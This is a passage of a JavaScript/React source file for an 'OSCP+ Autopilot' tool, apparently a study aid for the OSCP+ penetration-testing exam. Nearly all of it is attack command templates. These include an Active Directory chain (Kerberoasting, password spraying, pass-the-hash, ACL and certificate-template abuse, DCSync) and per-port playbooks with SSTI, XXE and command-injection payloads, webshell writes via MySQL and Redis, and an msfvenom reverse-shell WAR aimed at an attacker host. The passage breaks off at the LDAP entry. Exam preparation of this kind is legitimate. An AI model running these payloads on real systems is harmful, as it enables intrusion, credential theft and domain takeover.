const { useState, useCallback, useMemo, useEffect, useRef } = window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSCP+ AUTOPILOT v4 — Decision Engine for OSCP+ 2026
// Format: 1 AD Set (40pts) + 3 Standalones (60pts) = 100pts
// Pass: 70pts | Assumed breach AD | 23h45m + 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── AD ATTACK CHAIN (assumed breach — you START with domain creds) ───
const AD_CHAIN = [
  {
    phase: "1. Situational Awareness",
    desc: "You start with a domain user. Map the terrain before attacking.",
    steps: [
      { action: "Confirm domain access", cmd: (u,p,d,dc) => `# Verify your creds work:\ncrackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"user"}%${p||"password"}' ${dc||"DC_IP"}`, check: "Creds valid? What groups are you in?" },
      { action: "Enumerate domain info", cmd: (u,p,d,dc) => `# Domain info:\ncrackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --users\ncrackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --groups\n\n# LDAP enum:\nldapsearch -x -H ldap://${dc||"DC_IP"} -D '${u||"user"}@${d||"domain.local"}' -w '${p||"password"}' -b "DC=${(d||"domain.local").split('.').join(',DC=')}" "(objectClass=user)" sAMAccountName memberOf description`, check: "Users? Groups? Descriptions with passwords?" },
      { action: "Run BloodHound", cmd: (u,p,d,dc) => `# Collect BloodHound data:\nblooodhound-python -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -ns ${dc||"DC_IP"} -c all\n\n# Or SharpHound from Windows:\n.\\SharpHound.exe -c all --domain ${d||"domain.local"}\n\n# Import .json/.zip into BloodHound GUI\n# Check: Shortest Path to Domain Admin\n# Check: Kerberoastable users\n# Check: AS-REP Roastable users\n# Check: ACL abuse paths`, check: "CRITICAL: Find attack paths to DA", critical: true },
      { action: "Enumerate shares", cmd: (u,p,d,dc) => `crackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --shares\nsmbmap -H ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "SYSVOL? NETLOGON? Custom shares with scripts/creds?" },
      { action: "Find domain computers", cmd: (u,p,d,dc) => `crackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --computers\n\n# Check which machines you can access:\ncrackmapexec smb TARGETS_FILE -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "Which machines can you access? Admin on any?" },
    ]
  },
  {
    phase: "2. Credential Harvesting",
    desc: "Get more creds via Kerberos attacks, shares, and password spraying.",
    steps: [
      { action: "Kerberoasting", cmd: (u,p,d,dc) => `# Get TGS tickets for service accounts:\nimpacket-GetUserSPNs '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile kerberoast.txt\n\n# Crack them:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`, check: "Service accounts often have weak passwords!", critical: true },
      { action: "AS-REP Roasting", cmd: (u,p,d,dc) => `# Find accounts with no pre-auth:\nimpacket-GetNPUsers '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile asrep.txt\n\n# Crack them:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without Kerberos pre-auth?" },
      { action: "Search SYSVOL for creds", cmd: (u,p,d,dc) => `# GPP passwords (Group Policy Preferences):\ncrackmapexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M gpp_password\n\n# Manual search:\nsmbclient //${dc||"DC_IP"}/SYSVOL -U '${d||"domain"}/${u||"user"}%${p||"password"}' -c 'recurse;prompt;mget *'\ngrep -ri password SYSVOL/ 2>/dev/null\nfind SYSVOL/ -name "*.xml" -exec grep -li "cpassword" {} \\;`, check: "GPP passwords? Scripts with creds?" },
      { action: "Password spray", cmd: (u,p,d,dc) => `# Spray found passwords against all users:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p '${p||"password"}' -d '${d||"domain.local"}' --continue-on-success\n\n# Try common passwords:\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Season2026!' -d '${d||"domain.local"}' --continue-on-success\ncrackmapexec smb ${dc||"DC_IP"} -u users.txt -p 'Welcome1!' -d '${d||"domain.local"}' --continue-on-success`, check: "Password reuse? Common patterns?" },
    ]
  },
  {
    phase: "3. Lateral Movement",
    desc: "Use found credentials to move across domain machines.",
    steps: [
      { action: "Check admin access", cmd: (u,p,d,dc) => `# Test creds on all machines:\ncrackmapexec smb TARGETS -u '${u||"new_user"}' -p '${p||"new_pass"}' -d '${d||"domain.local"}'\ncrackmapexec winrm TARGETS -u '${u||"new_user"}' -p '${p||"new_pass"}' -d '${d||"domain.local"}'`, check: "(Pwn3d!) means local admin!", critical: true },
      { action: "PSExec / WMIExec", cmd: (u,p,d) => `# Get shell as admin:\nimpacket-psexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\nimpacket-wmiexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\nimpacket-atexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET`, check: "Try different exec methods if one fails" },
      { action: "Evil-WinRM", cmd: (u,p,d) => `evil-winrm -i TARGET -u '${u||"admin"}' -p '${p||"password"}'`, check: "Port 5985 open? Best interactive shell" },
      { action: "Dump local hashes", cmd: (u,p,d) => `# Dump SAM from compromised machine:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\n\n# Look for local admin hashes to reuse\n# Try Pass-the-Hash on other machines:\ncrackmapexec smb TARGETS -u 'Administrator' -H NTLM_HASH --local-auth`, check: "Local admin hash reuse across machines?" },
      { action: "Pass the Hash", cmd: (u,p,d) => `# PtH with found NTLM hash:\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/${u||"admin"}'@TARGET\nevil-winrm -i TARGET -u '${u||"admin"}' -H NTLM_HASH\ncrackmapexec smb TARGETS -u '${u||"admin"}' -H NTLM_HASH -d '${d||"domain.local"}'`, check: "NTLM hash = password equivalent" },
    ]
  },
  {
    phase: "4. ACL / Permission Abuse",
    desc: "BloodHound shows attack paths via misconfigured permissions.",
    steps: [
      { action: "GenericAll on user", cmd: (u,p,d,dc) => `# If you have GenericAll on a user — change their password:\nnet rpc password '${u||"target_user"}' 'NewPassword123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' ${dc||"DC_IP"} -c "setuserinfo2 target_user 23 'NewPassword123!'"`, check: "GenericAll = full control over object" },
      { action: "GenericAll on group", cmd: (u,p,d,dc) => `# Add yourself to a privileged group:\nnet rpc group addmem "Domain Admins" '${u||"attacker"}' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}`, check: "Can you add yourself to Domain Admins?" },
      { action: "GenericWrite / WriteDACL", cmd: (u,p,d,dc) => `# WriteDACL: Give yourself more permissions:\nimpacket-dacledit -action write -rights FullControl -principal '${u||"attacker"}' -target 'target_user' '${d||"domain.local"}/${u||"attacker"}:${p||"password"}' -dc-ip ${dc||"DC_IP"}\n\n# GenericWrite: Set SPN for Kerberoasting:\npython3 targetedKerberoast.py -u '${u||"attacker"}' -p '${p||"password"}' -d '${d||"domain.local"}' --dc-ip ${dc||"DC_IP"}`, check: "Abuse write permissions to escalate" },
      { action: "ForceChangePassword", cmd: (u,p,d,dc) => `# Change target user's password:\nnet rpc password 'target_user' 'NewPass123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}`, check: "Can change password without knowing old one" },
      { action: "ReadGMSAPassword", cmd: (u,p,d,dc) => `# If you can read GMSA passwords:\ncrackmapexec ldap ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --gmsa\n\n# Or with Python:\npython3 gMSADumper.py -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "GMSA = service account with auto-rotating passwords" },
    ]
  },
  {
    phase: "5. ADCS (Certificate Services)",
    desc: "If AD CS is present, abuse misconfigured certificate templates for DA.",
    steps: [
      { action: "Find ADCS + vulnerable templates", cmd: (u,p,d,dc) => `# Certipy — find all vulnerable templates:\ncertipy find -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -vulnerable -stdout\n\n# Or from Windows:\n.\\Certify.exe find /vulnerable`, check: "ESC1-ESC8 vulnerable templates?", critical: true },
      { action: "ESC1 — Template abuse", cmd: (u,p,d,dc) => `# Request cert with SAN of DA:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'\n\n# Auth with the cert:\ncertipy auth -pfx administrator.pfx -dc-ip ${dc||"DC_IP"}`, check: "Get DA cert → auth as DA!", critical: true },
      { action: "ESC4 — Template ACL abuse", cmd: (u,p,d,dc) => `# If you have write access to a template:\ncertipy template -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -template 'VULN-TEMPLATE' -save-old\n\n# Then request like ESC1:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'`, check: "Modify template → ESC1 attack" },
      { action: "Shadow Credentials", cmd: (u,p,d,dc) => `# If you have GenericWrite on a computer/user:\ncertipy shadow auto -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -account 'TARGET$' -dc-ip ${dc||"DC_IP"}\n\n# Or with pywhisker:\npython3 pywhisker.py -d '${d||"domain.local"}' -u '${u||"user"}' -p '${p||"password"}' --target 'TARGET$' --action add --dc-ip ${dc||"DC_IP"}`, check: "GenericWrite → Shadow Credentials → auth" },
    ]
  },
  {
    phase: "6. Domain Compromise",
    desc: "Final step: Domain Admin or equivalent access to the DC.",
    steps: [
      { action: "DCSync attack", cmd: (u,p,d,dc) => `# If you have replication rights (or are DA):\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc\n\n# Dump only specific user:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${dc||"DC_IP"} -just-dc-user Administrator`, check: "Full domain hash dump = game over", critical: true },
      { action: "Access DC", cmd: (u,p,d,dc) => `# Shell on DC:\nimpacket-psexec '${d||"domain.local"}/Administrator:password'@${dc||"DC_IP"}\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/Administrator'@${dc||"DC_IP"}\nevil-winrm -i ${dc||"DC_IP"} -u Administrator -H NTLM_HASH`, check: "Get shell, grab proof.txt" },
      { action: "Grab flags", cmd: () => `# On each compromised machine:\ntype C:\\Users\\Administrator\\Desktop\\proof.txt\ntype C:\\Users\\*\\Desktop\\local.txt\n\n# SCREENSHOT EVERYTHING!\n# Include: whoami, ipconfig, type proof.txt`, check: "SCREENSHOT with whoami + hostname + flag", critical: true },
    ]
  },
];

// ─── PORT PLAYBOOKS (standalone machines) ───
const PORT_PLAYBOOKS = {
  21: { service: "FTP", icon: "📁", priority: "HIGH", steps: [
    { action: "Anonymous login", cmd: (t) => `ftp ${t}\n# Login: anonymous / anonymous\n# Try: anonymous / (empty)`, check: "Files? Writable?", critical: true },
    { action: "Version check", cmd: (t) => `nmap -sV -p21 --script ftp-vuln*,ftp-anon ${t}`, check: "Known exploit?" },
    { action: "Brute-force", cmd: (t) => `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://${t} -t 4`, check: "Valid creds?" },
    { action: "Download all", cmd: (t) => `wget -r --no-passive ftp://anonymous:anonymous@${t}/`, check: "Sensitive files? Config? Creds?" },
    { action: "Upload webshell", cmd: () => `# If writable + shares web root:\nput shell.php\n# Then: curl http://TARGET/shell.php?cmd=whoami`, check: "Web root shared via FTP?" },
  ]},
  22: { service: "SSH", icon: "🔐", priority: "LOW", steps: [
    { action: "Banner & version", cmd: (t) => `nc -nv ${t} 22\nnmap -sV -p22 --script ssh-auth-methods ${t}`, check: "Old version? Auth methods?" },
    { action: "Try found creds", cmd: (t) => `ssh user@${t}\n# Try ALL creds found elsewhere`, check: "Password reuse!", critical: true },
    { action: "SSH key login", cmd: (t) => `chmod 600 id_rsa && ssh -i id_rsa user@${t}`, check: "Found private key?" },
    { action: "Brute with known users", cmd: (t) => `hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ssh://${t} -t 4`, check: "Only brute with known usernames" },
  ]},
  25: { service: "SMTP", icon: "📧", priority: "MEDIUM", steps: [
    { action: "User enumeration", cmd: (t) => `smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t ${t}\nnmap --script smtp-enum-users,smtp-commands,smtp-vuln* -p25 ${t}`, check: "Valid usernames?" },
    { action: "Send test email", cmd: (t) => `swaks --to user@${t} --from admin@${t} --server ${t} --body "test"`, check: "Open relay? Client-side attack?" },
  ]},
  53: { service: "DNS", icon: "🌐", priority: "HIGH", steps: [
    { action: "Zone transfer", cmd: (t) => `dig axfr @${t} DOMAIN\ndnsrecon -d DOMAIN -n ${t} -t axfr`, check: "Internal hostnames?", critical: true },
    { action: "Subdomain brute", cmd: (t) => `gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r ${t}:53`, check: "Hidden subdomains?" },
    { action: "Reverse lookup", cmd: (t) => `dnsrecon -r SUBNET/24 -n ${t}`, check: "IP → hostname mapping" },
  ]},
  80: { service: "HTTP", icon: "🌍", priority: "CRITICAL", steps: [
    { action: "Tech stack", cmd: (t) => `whatweb http://${t} -v && curl -I http://${t}`, check: "CMS? Framework? Server?", critical: true },
    { action: "Directory brute", cmd: (t) => `feroxbuster -u http://${t} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak,old -o ferox_80.txt`, check: "Admin panels? Uploads? Backups?", critical: true },
    { action: "CeWL custom wordlist", cmd: (t) => `# Build password wordlist from site content:\ncewl http://${t} -d 3 -m 5 --lowercase -w cewl_words.txt\n\n# Extract emails too:\ncewl http://${t} -d 3 -m 5 -e --email_file emails.txt\n\n# Mutate with hashcat rules:\nhashcat --stdout cewl_words.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > custom_passwords.txt\n\n# Use for login brute-force:\nhydra -L users.txt -P custom_passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" -s 80 -t 4`, check: "rockyou failed? Build context wordlist! See Wordlists tab" },
    { action: "VHost fuzzing", cmd: (t) => `gobuster vhost -u http://${t} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`, check: "Add found domains to /etc/hosts" },
    { action: "Nikto", cmd: (t) => `nikto -h http://${t} -o nikto.txt`, check: "Known vulns? Misconfigs?" },
    { action: "Check hidden paths", cmd: (t) => `curl -s http://${t}/robots.txt; curl -s http://${t}/sitemap.xml\ncurl -s http://${t}/ | grep -iE '(href|src|action|comment|hidden|password|secret|api|key|token|admin|debug|TODO|FIXME)'`, check: "Disallowed paths? Leaked info?" },
    { action: "Default creds", cmd: () => `# Always try:\n# WordPress: admin/admin, admin/password\n# Tomcat: tomcat/s3cret, admin/admin, tomcat/tomcat\n# Jenkins: admin/admin (or no auth)\n# Joomla: admin/admin\n# phpMyAdmin: root/(empty), root/root\n# Drupal: admin/admin`, check: "ALWAYS test defaults!", critical: true },
    { action: "SQL injection", cmd: (t) => `sqlmap -u "http://${t}/page?param=1" --batch --level 3 --risk 2 --dbs`, check: "Test ALL parameters" },
    { action: "LFI / RFI", cmd: (t) => `# LFI:\ncurl "http://${t}/page?file=../../../etc/passwd"\ncurl "http://${t}/page?file=....//....//....//etc/passwd"\ncurl "http://${t}/page?file=/etc/passwd%00"\n\n# Windows LFI:\ncurl "http://${t}/page?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"\n\n# PHP wrappers:\ncurl "http://${t}/page?file=php://filter/convert.base64-encode/resource=index.php"`, check: "Path traversal? PHP wrappers?" },
    { action: "File upload bypass", cmd: () => `# Bypass techniques:\n# 1. Change extension: .php5, .phtml, .phar, .phps, .pHP\n# 2. Double ext: shell.php.jpg\n# 3. Null byte: shell.php%00.jpg\n# 4. Content-Type: image/jpeg with PHP content\n# 5. Magic bytes: GIF89a<?php system($_GET['cmd']); ?>\n# 6. .htaccess: AddType application/x-httpd-php .jpg`, check: "Bypass filters for RCE" },
    { action: "Command injection", cmd: (t) => `# Test characters: ; | \` $() & && ||\ncurl "http://${t}/page?ip=127.0.0.1;id"\ncurl "http://${t}/page?ip=127.0.0.1|id"\ncurl "http://${t}/page?ip=\$(id)"`, check: "OS command execution?" },
    { action: "SSTI (Template Injection)", cmd: (t) => `# Test payloads in ALL input fields:\n{{7*7}}  →  49 = Jinja2/Twig\n\${7*7}  →  49 = Freemarker/Velocity\n#{7*7}  →  49 = Thymeleaf\n<%= 7*7 %>  →  49 = ERB (Ruby)\n\n# Jinja2 RCE:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig RCE:\n{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`, check: "Template engine? → RCE!", critical: true },
    { action: "XXE (XML External Entity)", cmd: (t) => `# If app accepts XML input:\n<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>\n\n# Blind XXE (out-of-band):\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://LHOST:80/xxe">\n]>\n<root>&xxe;</root>\n\n# PHP base64 wrapper:\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">\n]>`, check: "XML input? File read or SSRF via XXE" },
    { action: "SSRF (Server-Side Request Forgery)", cmd: (t) => `# Test internal access:\ncurl "http://${t}/fetch?url=http://127.0.0.1:80"\ncurl "http://${t}/fetch?url=http://127.0.0.1:8080"\ncurl "http://${t}/fetch?url=http://127.0.0.1:3306"\n\n# Cloud metadata (if cloud):\ncurl "http://${t}/fetch?url=http://169.254.169.254/latest/meta-data/"\n\n# Port scan internal:\nfor p in 21 22 80 443 3306 5432 8080; do curl -s "http://${t}/fetch?url=http://127.0.0.1:$p" & done`, check: "Internal services? Metadata?" },
    { action: "Deserialization", cmd: (t) => `# Java (ysoserial):\njava -jar ysoserial.jar CommonsCollections1 'ping LHOST' | base64\n\n# PHP:\n# Look for serialize()/unserialize() in source\n# Craft __wakeup()/__destruct() chains\n\n# Python (pickle):\nimport pickle, os\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ('id',))\npickle.dumps(Exploit())`, check: "Serialized objects in cookies/params?" },
    { action: "JWT abuse", cmd: (t) => `# Decode JWT:\necho 'JWT_TOKEN' | cut -d'.' -f2 | base64 -d 2>/dev/null\n\n# None algorithm attack:\n# Change header to {"alg":"none"} and remove signature\n\n# Crack JWT secret:\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njohn jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256\n\n# jwt_tool:\npython3 jwt_tool.py JWT_TOKEN -T -S hs256 -p 'secret'`, check: "Weak secret? None alg? Key confusion?" },
  ]},
  443: { service: "HTTPS", icon: "🔒", priority: "CRITICAL", steps: [
    { action: "SSL cert recon", cmd: (t) => `openssl s_client -connect ${t}:443 2>/dev/null | openssl x509 -noout -text | grep -E '(Subject|DNS|Issuer)'`, check: "Hostnames? Internal names?", critical: true },
    { action: "Full web enum", cmd: (t) => `feroxbuster -u https://${t} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -k -o ferox_443.txt`, check: "Different content than 80?" },
    { action: "SSL vulns", cmd: (t) => `nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p443 ${t}`, check: "Heartbleed? POODLE?" },
  ]},
  110: { service: "POP3", icon: "📬", priority: "MEDIUM", steps: [
    { action: "Login & read", cmd: (t) => `nc -nv ${t} 110\n# USER username\n# PASS password\n# LIST\n# RETR 1`, check: "Passwords in emails?", critical: true },
  ]},
  111: { service: "RPCBind/NFS", icon: "🔗", priority: "HIGH", steps: [
    { action: "List RPC & NFS", cmd: (t) => `rpcinfo -p ${t}\nshowmount -e ${t}`, check: "Mountable exports?", critical: true },
    { action: "Mount NFS", cmd: (t) => `mkdir /tmp/nfs && mount -t nfs ${t}:/share /tmp/nfs -o nolock\nls -la /tmp/nfs/`, check: "SSH keys? Config files?" },
    { action: "UID trick", cmd: () => `# If NFS uses root_squash, create user with matching UID:\nuseradd -u TARGET_UID tempuser\nsu tempuser\n# Now access files as that user`, check: "Can you read restricted files?" },
  ]},
  135: { service: "MSRPC", icon: "🪟", priority: "MEDIUM", steps: [
    { action: "Enumerate RPC", cmd: (t) => `rpcclient -U "" -N ${t}\nimpacket-rpcdump ${t}`, check: "Null session? Endpoints?" },
  ]},
  139: { service: "NetBIOS", icon: "📂", priority: "HIGH", steps: [
    { action: "Full enum", cmd: (t) => `enum4linux -a ${t} 2>/dev/null | tee enum4linux.txt`, check: "Users? Shares? Policies?", critical: true },
    { action: "List & connect shares", cmd: (t) => `smbclient -L //${t} -N\nsmbmap -H ${t}\ncrackmapexec smb ${t} --shares -u '' -p ''`, check: "Readable/writable shares?" },
  ]},
  445: { service: "SMB", icon: "📂", priority: "HIGH", steps: [
    { action: "Null/guest enum", cmd: (t) => `enum4linux -a ${t} | tee enum4linux.txt\nsmbmap -H ${t} -u '' -p ''\nsmbmap -H ${t} -u 'guest' -p ''`, check: "Users? Shares?", critical: true },
    { action: "Download from shares", cmd: (t) => `smbclient //${t}/SHARE -N -c 'recurse;prompt;mget *'`, check: "Config? Passwords?" },
    { action: "Check EternalBlue", cmd: (t) => `nmap --script smb-vuln-ms17-010 -p445 ${t}`, check: "MS17-010?", critical: true },
    { action: "Brute + PSExec", cmd: (t) => `crackmapexec smb ${t} -u users.txt -p passwords.txt --continue-on-success\nimpacket-psexec user:pass@${t}`, check: "Admin creds?" },
  ]},
  1433: { service: "MSSQL", icon: "🗃️", priority: "HIGH", steps: [
    { action: "Nmap scripts", cmd: (t) => `nmap --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p1433 ${t}`, check: "Empty sa? NTLM info?" },
    { action: "Connect & xp_cmdshell", cmd: (t) => `impacket-mssqlclient sa:password@${t}\n# In SQL shell:\nENABLE_XP_CMDSHELL\nxp_cmdshell whoami`, check: "RCE via SQL!", critical: true },
    { action: "Enum databases", cmd: () => `SELECT name FROM sys.databases;\nSELECT * FROM master..syslogins;`, check: "Credentials in DB?" },
  ]},
  3306: { service: "MySQL", icon: "🐬", priority: "HIGH", steps: [
    { action: "Root no password", cmd: (t) => `mysql -h ${t} -u root -p''`, check: "Empty root?", critical: true },
    { action: "Dump & file ops", cmd: () => `SHOW DATABASES; USE db; SHOW TABLES; SELECT * FROM users;\nSELECT LOAD_FILE('/etc/passwd');\nSELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';`, check: "Creds? File read/write?" },
  ]},
  3389: { service: "RDP", icon: "🖥️", priority: "MEDIUM", steps: [
    { action: "Connect", cmd: (t) => `xfreerdp /u:user /p:pass /v:${t} /cert:ignore +clipboard /dynamic-resolution`, check: "Use found creds" },
    { action: "Check vulns", cmd: (t) => `nmap --script rdp-vuln-ms12-020,rdp-enum-encryption -p3389 ${t}`, check: "BlueKeep?" },
  ]},
  5432: { service: "PostgreSQL", icon: "🐘", priority: "HIGH", steps: [
    { action: "Default creds", cmd: (t) => `psql -h ${t} -U postgres -W\n# Try: postgres/postgres, postgres/(empty)`, check: "Default password?", critical: true },
    { action: "RCE via SQL", cmd: () => `# If access:\nCOPY (SELECT '') TO PROGRAM 'id';\n\n# Or create function:\nCREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;\nSELECT system('id');`, check: "Command execution via postgres" },
  ]},
  5985: { service: "WinRM", icon: "⚡", priority: "HIGH", steps: [
    { action: "Evil-WinRM", cmd: (t) => `evil-winrm -i ${t} -u user -p 'password'`, check: "Best Windows shell!", critical: true },
    { action: "Pass the Hash", cmd: (t) => `evil-winrm -i ${t} -u user -H NTLM_HASH`, check: "PtH for WinRM" },
  ]},
  6379: { service: "Redis", icon: "🔴", priority: "HIGH", steps: [
    { action: "No-auth access", cmd: (t) => `redis-cli -h ${t}\nINFO\nKEYS *\nGET key`, check: "Unauthenticated?", critical: true },
    { action: "Write SSH key", cmd: (t) => `redis-cli -h ${t} flushall\ncat ~/.ssh/id_rsa.pub | redis-cli -h ${t} -x set ssh_key\nredis-cli -h ${t} config set dir /var/lib/redis/.ssh/\nredis-cli -h ${t} config set dbfilename authorized_keys\nredis-cli -h ${t} save`, check: "SSH via Redis" },
    { action: "Write webshell", cmd: (t) => `redis-cli -h ${t} config set dir /var/www/html/\nredis-cli -h ${t} set shell '<?php system($_GET["cmd"]); ?>'\nredis-cli -h ${t} config set dbfilename shell.php\nredis-cli -h ${t} save`, check: "Webshell via Redis" },
  ]},
  8080: { service: "HTTP-Alt", icon: "🌍", priority: "CRITICAL", steps: [
    { action: "Identify service", cmd: (t) => `whatweb http://${t}:8080 && curl -I http://${t}:8080`, check: "Tomcat? Jenkins? Other?", critical: true },
    { action: "Tomcat manager", cmd: (t) => `curl http://${t}:8080/manager/html\n# Default: tomcat:s3cret, tomcat:tomcat, admin:admin\n# Deploy WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war\n# Upload via /manager/html`, check: "WAR upload = RCE", critical: true },
    { action: "Jenkins", cmd: (t) => `curl http://${t}:8080/script\n# Groovy RCE:\n# "whoami".execute().text\n# Or manage Jenkins > Script Console`, check: "Script console = RCE" },
    { action: "Full web enum", cmd: (t) => `feroxbuster -u http://${t}:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,jsp -o ferox_8080.txt`, check: "Hidden paths?" },
  ]},
  8443: { service: "HTTPS-Alt", icon: "🔒", priority: "HIGH", steps: [
    { action: "Enum", cmd: (t) => `whatweb https://${t}:8443 -v\nferoxbuster -u https://${t}:8443 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k`, check: "API? Admin?" },
  ]},
  88: { service: "Kerberos", icon: "🎫", priority: "MEDIUM", steps: [
    { action: "Enumerate users (no creds)", cmd: (t) => `kerbrute userenum -d DOMAIN --dc ${t} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`, check: "Valid domain users?", critical: true },
    { action: "AS-REP roast (no creds)", cmd: (t) => `impacket-GetNPUsers DOMAIN/ -dc-ip ${t} -usersfile users.txt -no-pass -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without pre-auth?" },
    { action: "Kerberoast (with creds)", cmd: (t) => `impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip ${t} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`, check: "Service account hashes?" },
  ]},
  143: { service: "IMAP", icon: "📨", priority: "MEDIUM", steps: [
    { action: "Banner & login", cmd: (t) => `nc -nv ${t} 143\n# a LOGIN user password\n# a LIST "" "*"\n# a SELECT INBOX\n# a FETCH 1:* (BODY[HEADER.FIELDS (SUBJECT FROM)])`, check: "Emails with creds?", critical: true },
    { action: "Brute-force", cmd: (t) => `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://${t} -t 4`, check: "Valid creds?" },
  ]},
  161: { service: "SNMP", icon: "📡", priority: "HIGH", steps: [
    { action: "Community string brute", cmd: (t) => `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt ${t}`, check: "Valid community string?", critical: true },
    { action: "Full SNMP walk", cmd: (t) => `snmpwalk -v2c -c public ${t} . | tee snmpwalk.txt\nsnmpbulkwalk -v2c -c public ${t} . | tee snmpbulk.txt`, check: "Users? Software? Processes? Interfaces?", critical: true },
    { action: "Extract users", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.4.1.77.1.2.25`, check: "Windows user enumeration via SNMP" },
    { action: "Extract running processes", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.25.4.2.1.2`, check: "Running services? Creds in command line?" },
    { action: "Extract installed software", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.25.6.3.1.2`, check: "Vulnerable software versions?" },
    { action: "Extract TCP connections", cmd: (t) => `snmpwalk -v2c -c public ${t} 1.3.6.1.2.1.6.13.1.3`, check: "Internal services?" },
  ]},
  389: { service: "LDAP", icon: "📒", priority: "HIGH", steps: [
